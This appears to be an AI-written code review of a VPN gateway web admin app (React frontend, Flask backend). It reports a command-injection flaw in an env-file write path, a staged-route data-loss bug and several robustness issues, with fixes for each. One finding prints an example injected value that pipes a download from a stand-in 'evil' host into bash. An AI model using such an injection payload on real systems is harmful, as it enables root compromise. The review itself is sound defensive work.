---
phase: 16-web-admin-ux-upgrade
reviewed: 2026-08-10T00:00:00Z
depth: standard
files_reviewed: 14
files_reviewed_list:
  - docs/README.ru.md
  - docs/REFERENCE.md
  - src/admin/src/App.css
  - src/admin/src/App.jsx
  - src/admin/src/api.js
  - src/admin/src/components/DiffPreview.jsx
  - src/admin/src/components/ui/progress.jsx
  - src/admin/src/pages/Dashboard.jsx
  - src/admin/src/pages/Diagnostics.jsx
  - src/admin/src/pages/Logs.jsx
  - src/admin/src/pages/Routes.jsx
  - src/admin/src/routeStaging.js
  - src/deploy.sh
  - src/scripts/splitgate-admin.py
findings:
  critical: 2
  warning: 9
  info: 3
  total: 14
status: issues_found
---

# Phase 16: Code Review Report

**Reviewed:** 2026-08-10
**Depth:** standard
**Files Reviewed:** 14
**Status:** issues_found

## Summary

Reviewed the web admin UX upgrade: React SPA pages (Dashboard, Diagnostics, Logs, Routes), the shared
route-staging store, the diff-preview and progress UI components, `deploy.sh`, and the Flask backend
(`splitgate-admin.py`), plus both docs files. The overall structure is solid (SSE hooks, staging/diff
workflow, dedupe/filter utilities), but two issues rise to BLOCKER: an unsanitized write path from the
Settings "env vars" API into a file that is later `source`d as root by shell scripts (command injection
risk), and a client-side data-loss bug where staged pending routes are discarded even when the backend
bulk-add request fails. Several further issues degrade robustness (missing input validation, silent
failure paths, unbounded in-memory session store) and both doc files are out of sync with the new API
surface added in this phase, which directly violates this project's own CLAUDE.md convention requiring
docs to be updated for every task that touches them.

## Critical Issues

### CR-01: `/api/settings/env` writes unsanitized values into a file that is `source`d as root

**File:** `src/scripts/splitgate-admin.py:614-625` (`api_settings_env_put`, `write_env_file`)
**Also affects:** `src/scripts/routing.sh:72` (`source /etc/splitgate/vpn-gateway.env`), `src/scripts/update-vpn-routes:35` (same `source`)

**Issue:** `api_settings_env_put` only validates that keys match `^[A-Z][A-Z0-9_]*$`; it performs **no
validation or escaping on values**. `write_env_file` then does:

```python
def write_env_file(path, data):
    with open(path, 'w') as fh:
        for k, v in data.items():
            fh.write(f'{k}={v}\n')
```

`/etc/splitgate/vpn-gateway.env` is not merely parsed — it is `source`d directly as a bash script by
both `routing.sh` (line 72) and `update-vpn-routes` (line 35), both of which run as root (via
`/api/config/apply` and the daily cron job / manual `/api/config/update`). A value such as:

```
KEENETIC_GW=192.168.1.1; curl http://evil/x | bash #
```

submitted through `PUT /api/settings/env` will be written verbatim and then **executed as a shell
command as root** the next time routing is applied. This is a genuine command-injection primitive —
unlike `awg0.conf` (which intentionally supports `PostUp`/`PreUp` shell directives by design),
`vpn-gateway.env` is documented and expected to be a plain `KEY=value` config file, so admins editing
it via the Settings page have no reason to expect shell metacharacters to be dangerous.

Also note a related correctness bug: values containing embedded newlines are not rejected either,
which means a single "value" can inject arbitrary new `KEY=VALUE` lines that bypass the `KEY_RE`
validation entirely (since only the *original* submitted keys are checked, not lines produced by
newline injection inside a value).

**Fix:** Reject (or shell-quote) values containing shell metacharacters/newlines before writing, and/or
switch `vpn-gateway.env` to a format that is safely parsed (not `source`d) by the consuming scripts —
e.g. use `env -S`/`.env`-style parsing with `KEY=value` read via a `while IFS='=' read` loop instead of
`source`, or validate values with a strict allowlist regex per known key:

```python
VALUE_RE = re.compile(r'^[^\n\r;&|`$(){}<>]*$')  # no shell metacharacters, no newlines

@app.route('/api/settings/env', methods=['PUT'])
@require_auth
def api_settings_env_put():
    body = request.get_json(silent=True) or {}
    new_vars = body.get('vars', {})
    KEY_RE = re.compile(r'^[A-Z][A-Z0-9_]*$')
    for k, v in new_vars.items():
        if not KEY_RE.match(k):
            return jsonify({'error': f'Invalid key format: {k}'}), 400
        if not VALUE_RE.match(str(v)):
            return jsonify({'error': f'Invalid value for {k}: contains disallowed characters'}), 400
    current = parse_env_file(ENV_PATH)
    current.update(new_vars)
    write_env_file(ENV_PATH, current)
    return jsonify({'ok': True})
```

---

### CR-02: Staged pending routes are discarded on Apply even when the backend request fails

**File:** `src/admin/src/pages/Routes.jsx:411-436` (`flushStagedList`, `applyRoutes`)

**Issue:**

```js
async function flushStagedList(list) {
  const entries = getPending(list)
  if (!entries.length) return
  await apiFetch(`/api/routes/${list}/bulk`, { method: 'POST', body: JSON.stringify({ entries }) })
  clearPending(list)
}
```

`flushStagedList` does not check `response.ok` (or even read the JSON body) before calling
`clearPending(list)`. If the bulk POST resolves with a non-2xx status (e.g. the backend crashes on a
malformed entry — see WR-06 — or the route file is temporarily unwritable), `apiFetch` still resolves
normally (it only special-cases HTTP 401), so `clearPending(list)` runs unconditionally and the user's
staged CIDRs are wiped from `routeStaging.js` without ever having been persisted server-side. There is
no way to recover the lost staged entries — the user sees `applyMsg` say "Error: ..." (if the outer
`/api/config/apply` call also fails) but the staged additions that were silently dropped are gone for
good, and if `/api/config/apply` itself succeeds afterward, the UI reports `✓ Applied` even though the
routes were never actually added.

**Fix:** Only clear pending entries after confirming the bulk write succeeded:

```js
async function flushStagedList(list) {
  const entries = getPending(list)
  if (!entries.length) return true
  const r = await apiFetch(`/api/routes/${list}/bulk`, { method: 'POST', body: JSON.stringify({ entries }) })
  if (!r.ok) return false
  clearPending(list)
  return true
}

async function applyRoutes() {
  setApplying(true)
  setApplyMsg('Applying…')
  try {
    const okVpn = await flushStagedList('vpn')
    const okIsp = await flushStagedList('isp')
    if (!okVpn || !okIsp) {
      setApplyMsg('Error: failed to save staged routes — not applied, changes kept pending')
      return
    }
    const r = await apiFetch('/api/config/apply', { method: 'POST' })
    const d = await r.json()
    setApplyMsg(r.ok ? '✓ Applied' : `Error: ${d.error}`)
    if (_reloaders.vpn) _reloaders.vpn()
    if (_reloaders.isp) _reloaders.isp()
  } catch {
    setApplyMsg('Error: apply failed')
  } finally {
    setApplying(false)
  }
}
```

## Warnings

### WR-01: `/api/settings/awg-config` accepts arbitrary content with no directive validation

**File:** `src/scripts/splitgate-admin.py:652-662`
**Issue:** `api_settings_awg_config_put` only checks that the string `[Interface]` is present anywhere
in the submitted content, then writes it verbatim to `/etc/amnezia/amneziawg/awg0.conf` (mode 0600).
AmneziaWG/wg-quick configs support `PostUp`/`PreUp`/`PostDown`/`PreDown` directives that run arbitrary
shell commands as root when the tunnel comes up/down. Unlike the env-file issue (CR-01) this is
arguably "by design" for a wg-quick config, but there is no confirmation step, no diff/preview, and no
warning to the admin that this field can execute shell commands — unlike the password-change and
rollback endpoints, which require explicit confirmation payloads.
**Fix:** At minimum, surface a warning in the UI when `PostUp`/`PreUp`/`PostDown`/`PreDown` keys are
present in submitted content, or require the same `{"confirmation": "..."}` pattern used by
`/api/settings/rollback`.

### WR-02: In-memory session set grows without bound

**File:** `src/scripts/splitgate-admin.py:40-68`
**Issue:** Every request authenticated via Basic Auth (i.e. any request without a currently valid
`sg_session` cookie) creates and stores a brand-new `secrets.token_hex(16)` in the module-level
`_sessions` set, which is never pruned or size-capped. Any client/browser that doesn't persist or send
the cookie (curl scripts, API clients, `SameSite=Strict` cross-context calls) will accumulate one new
session token per request for the lifetime of the process, growing memory usage unboundedly on a
long-running always-on service.
**Fix:** Store `(token -> created_at)` and expire/evict entries older than the cookie's `max_age`
(30 days) on each request, or cap `_sessions` to a fixed size with LRU eviction.

### WR-03: Unescaped backreferences in `/api/settings/secrets` regex substitution

**File:** `src/scripts/splitgate-admin.py:675-687`
**Issue:**
```python
content = re.sub(rf'^(\s*{re.escape(key)}\s*=\s*)(.+)$', rf'\g<1>{val}', content, flags=re.MULTILINE)
```
`val` is interpolated directly into the *replacement* pattern of `re.sub`, not escaped. If an admin
submits a value containing a backslash followed by a digit (e.g. `\1`) or other `re.sub` replacement
syntax (`\g<...>`), this raises `re.error: invalid group reference` — an unhandled exception that
surfaces as a generic 500 with no explanation of what went wrong, and legitimate-looking values (e.g.
copy-pasted preshared keys that happen to contain `\N` sequences) will be silently rejected.
**Fix:** Escape backslashes in the replacement string, or avoid `re.sub` entirely by rebuilding lines
manually:
```python
val_escaped = val.replace('\\', '\\\\')
content = re.sub(rf'^(\s*{re.escape(key)}\s*=\s*)(.+)$', rf'\g<1>{val_escaped}', content, flags=re.MULTILINE)
```

### WR-04: `write_env_file` / `write_routes_with_desc` do not quote or reject values with spaces/newlines

**File:** `src/scripts/splitgate-admin.py:159-162`
**Issue:** `write_env_file` writes `f'{k}={v}\n'` with no quoting. Since the file is `source`d by bash
(see CR-01), any value containing spaces will break `source`-time word-splitting for that variable
(the shell script's `${VAR}` expansions elsewhere assume single-token values). Round-tripping a
double-quoted value (`strip_env_quotes` removes quotes on read) also permanently loses the quoting on
next write, silently changing the file's semantics for downstream consumers even for legitimate edits.
**Fix:** Re-quote all values on write (`f'{k}="{v}"\n'`) and validate they don't already contain
unescaped double quotes.

### WR-05: `CIDR_RE`/`IP_RE` do not validate octet or prefix ranges (frontend + backend)

**File:** `src/admin/src/pages/Routes.jsx:14`, `src/admin/src/pages/Diagnostics.jsx:9`, `src/scripts/splitgate-admin.py:35-36`
**Issue:** `CIDR_RE = /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\/\d{1,2}$/` (and the Python equivalent, and
`IP_RE`) match any 1-3 digit group per octet and any 1-2 digit prefix, accepting clearly invalid input
such as `999.999.999.999/99`. This validation gap exists on both the client (`Routes.jsx`,
`Diagnostics.jsx`) and the server (`splitgate-admin.py`), so an invalid CIDR can be written into
`vpn-routes-custom.txt`/`isp-routes-custom.txt` and only fails much later when `routing.sh` attempts
`ip route add` against it — with no clear error surfaced back to the admin UI (the failure happens
inside `routing.sh`'s stderr, which `/api/config/apply` does report, but the offending line isn't
identified).
**Fix:** Use `ipaddress.ip_network(value, strict=False)` (already imported and used elsewhere in
`splitgate-admin.py` for `check_route_decision`) to validate CIDRs server-side, and a matching octet
range check (`0-255`) plus prefix range (`0-32`) client-side.

### WR-06: Route bulk-add endpoints crash on non-object entries

**File:** `src/scripts/splitgate-admin.py:331-349`, `:402-420`
**Issue:** `api_routes_vpn_bulk`/`api_routes_isp_bulk` validate that `entries` is a list, but not that
each item is a dict. `entry.get('cidr', ...)` on a non-dict item (e.g. `entries: ["1.2.3.0/24"]`,
which is a natural mistake for an API caller to make) raises an unhandled `AttributeError`, producing
a generic 500 via the Flask error handler with no useful message, and (per CR-02) this is exactly the
kind of failure that silently discards staged client-side routes.
**Fix:**
```python
for entry in new_entries:
    if not isinstance(entry, dict):
        continue
    cidr = str(entry.get('cidr', '')).strip()
    ...
```

### WR-07: Add/Edit dialogs close and reset even when the underlying request fails

**File:** `src/admin/src/pages/Routes.jsx:77-85` (`AddSingleDialog.handleAdd`), `:172-179` (`EditDialog.handleSave`)
**Issue:** `handleAdd`/`handleEdit` in `RouteSection` swallow HTTP errors internally (they set `msg`
state but never throw/reject), so `await onAdd(...)` / `await onSave(...)` in the dialogs always
resolves successfully. Both dialogs then unconditionally call `reset()` and `onClose()` — the modal
closes as if the operation succeeded even when the server returned 400/409/500. The error message does
appear below the (now-closed) table, but the immediate UX signal ("dialog closed") tells the user the
add/edit worked when it may not have.
**Fix:** Have `handleAdd`/`handleEdit` return a result object (as `handleBulkAdd` already does) and
only close the dialog when the result indicates success:
```js
async function handleAdd(entry) {
  setMsg('')
  const r = await apiFetch(`/api/routes/${endpoint}`, { method: 'POST', body: JSON.stringify(entry) })
  if (!r.ok) { const d = await r.json(); setMsg(d.error); load(); return { ok: false } }
  load()
  return { ok: true }
}
```

### WR-08: Delete has no error handling — dialog closes and list "succeeds" even on failure

**File:** `src/admin/src/pages/Routes.jsx:308-312` (`handleDelete`)
**Issue:**
```js
async function handleDelete() {
  await apiFetch(`/api/routes/${endpoint}`, { method: 'DELETE', body: JSON.stringify({ cidr: deleteEntry.cidr }) })
  setDeleteEntry(null)
  load()
}
```
The response is discarded entirely — no `r.ok` check, no error surfaced to the user. If the DELETE
request fails (network error, backend exception), the confirmation dialog still closes and `load()`
re-fetches the (unchanged) route list, giving the user no indication that the delete did not happen.
**Fix:** Check `r.ok` and set `msg` on failure, mirroring the pattern already used by `handleAdd`/`handleEdit`.

### WR-09: Docs are out of sync with the new API surface and pages added in this phase

**File:** `docs/README.ru.md`, `docs/REFERENCE.md`
**Issue:** This project's `CLAUDE.md` explicitly requires: *"Before closing any task, grep the entire
project for references to every renamed, removed, or added concept... Update all affected files:
scripts, docs (README.md, docs/README.ru.md, docs/REFERENCE.md)..."*. Neither doc reflects this phase's
additions:
- `docs/README.ru.md` — "Страницы" list (line 222-228) enumerates Dashboard, Services, Routes, Logs,
  Config, Settings, but **omits the Diagnostics page** (`src/admin/src/pages/Diagnostics.jsx`, wired
  into nav/routing in `App.jsx`).
- `docs/REFERENCE.md` — the "API Endpoints" table (lines 870-926) does not document:
  `GET /api/status/resources`, `GET /api/resources/watch`, `GET /api/services/watch`,
  `POST /api/services/bulk/{action}`, `POST /api/routes/{vpn,isp}/bulk`, `GET /api/routes/backup`,
  `GET /api/logs/history`, `GET /api/diag/whois`, `GET /api/diag/traceroute`,
  `GET /api/diag/route-match`, `GET /api/settings/awg-config` + `PUT`, `POST /api/settings/restart-admin`.
**Fix:** Add a Diagnostics entry to the README.ru.md page list, and extend the REFERENCE.md API table
with the endpoints listed above (each already implemented in `splitgate-admin.py`).

## Info

### IN-01: `unstage()` in `routeStaging.js` is exported but never called

**File:** `src/admin/src/routeStaging.js:44-49`
**Issue:** `unstage(list, cidr)` is defined and exported but no page imports or calls it (`grep -rn
"unstage" src/admin/src` only matches the definition itself). There is currently no UI affordance to
remove a single staged pending route before Apply — only `clearPending(list)` (clear the whole list)
is wired up in `Routes.jsx`/`Logs.jsx`. Either wire `unstage` into `DiffPreview`/`RouteSection` (e.g. a
remove icon next to each pending addition) or delete the dead export.

### IN-02: `Progress` component does not guard against `NaN`

**File:** `src/admin/src/components/ui/progress.jsx:5`
**Issue:** `Math.min(100, Math.max(0, value ?? 0))` only guards `null`/`undefined` via `??`; if `value`
is `NaN` (e.g. `Dashboard.jsx` passes `(resources.mem_used / resources.mem_total) * 100` when
`mem_total` is `0`, or `resources` fields are otherwise malformed), `Math.max(0, NaN)` is `NaN`, and
the resulting `style={{ width: 'NaN%' }}` is invalid CSS (silently ignored by the browser, leaving the
bar at its previous/default width). `Dashboard.jsx` already guards the `mem_total`/`disk_total` case
with `resources && resources.mem_total ? ... : 0`, but `cpu_percent` is passed straight through
(`resources?.cpu_percent ?? 0`) and would still propagate `NaN` if the backend ever sent a non-numeric
value.
**Fix:** `const pct = Number.isFinite(value) ? Math.min(100, Math.max(0, value)) : 0`.

### IN-03: `ipSortKey` does not handle malformed CIDR input

**File:** `src/admin/src/pages/Routes.jsx:20-24`
**Issue:** `ipSortKey` assumes exactly 4 dot-separated octets (`ip.split('.')`); given the lenient
`CIDR_RE` (WR-05), a malformed entry that somehow reaches `routes` state with fewer/more octets would
produce `undefined` → `parseInt(undefined, 10)` → `NaN` → `"NaN"` in the sort key, which sorts
inconsistently rather than throwing, but silently produces a nonsensical table order.
**Fix:** Depends on WR-05 being fixed upstream; alternatively pad/validate defensively in `ipSortKey`.

---

_Reviewed: 2026-08-10_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
